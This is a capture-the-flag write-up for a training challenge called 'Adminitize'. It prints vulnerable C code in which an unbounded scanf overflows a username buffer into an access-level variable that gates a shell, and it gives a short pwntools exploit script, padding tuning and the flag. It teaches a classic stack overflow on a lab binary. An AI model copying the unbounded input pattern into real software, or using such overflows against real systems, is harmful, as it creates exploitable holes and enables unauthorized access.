# Adminitize

---

### Challenge Description

> Prove that you're an admin and i'll give you a shell on my system.

> Interact with the service at: 3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg:30101

[adminitize.zip](https://github.com/caprinux/Cyberthon-2021-Training/files/6330454/adminitize.zip)

---

### Solution

First we run the binary,

![image](https://user-images.githubusercontent.com/76640319/115133405-88498900-a03a-11eb-8e6e-aba60d3ffb8e.png)

as you can see, it takes in a Username, and then checks for our access level. 

We take a look at the source code next.

```c
void shell()
{
    system("/bin/sh");
}
int main()
{
    char access_level[7] = "PUBLIC\x00";
    char username[32];
    ...
    ...
    scanf("%s", username);
    printf("Greetings, %s. Your access level is %s.\n", username, access_level);

    if (!strcmp(access_level, "ADMIN")) {
        puts("Granting access...");
        shell();
    } else {
        puts("Sorry, your access level is too low.");
    }
```

As you can see, the program scans in a username without limiting size of input.

It then checks our access_level against "ADMIN" and grants us a shell if the string compare (strcmp) passes.

However, our access_level is fixed as PUBLIC\x00. 

Since username is fixed to take in 32 bytes, and scanf doesnt not limit input, we can overflow the username and overwrite other variables in the stack.

Hence our exploit will look something like: `BUFFER + "ADMIN"`

Since username holds 32 bytes, our buffer will probably be 32 bytes or more. 

Let's try it out. We write a quick pwntools script

```py
from pwn import * #import pwntools library

p = process("./adminitize") #run the program

p.sendline("B"*30 + 'ADMIN') #send buffer and "ADMIN" to program

p.interactive() # interact with program
```

![image](https://user-images.githubusercontent.com/76640319/115133647-7668e580-a03c-11eb-8516-50f4b55cb2e8.png)

Hmm seems like we haven't hit our access_level variable yet.

Let's try 40. 

![image](https://user-images.githubusercontent.com/76640319/115133668-897bb580-a03c-11eb-817e-c93ad2d9208a.png)

Look! Our access_level is now DMIN. We have hit access_level and overflowed it partially.

If we increase our buffer size by 1 now, we can probably overflow access_level totally with "ADMIN"

Let's try it on the service.

![image](https://user-images.githubusercontent.com/76640319/115133709-d495c880-a03c-11eb-948d-75e4e4d77f51.png)

```
CTFSG{u53l355_4cc355_l3v3l5}
```
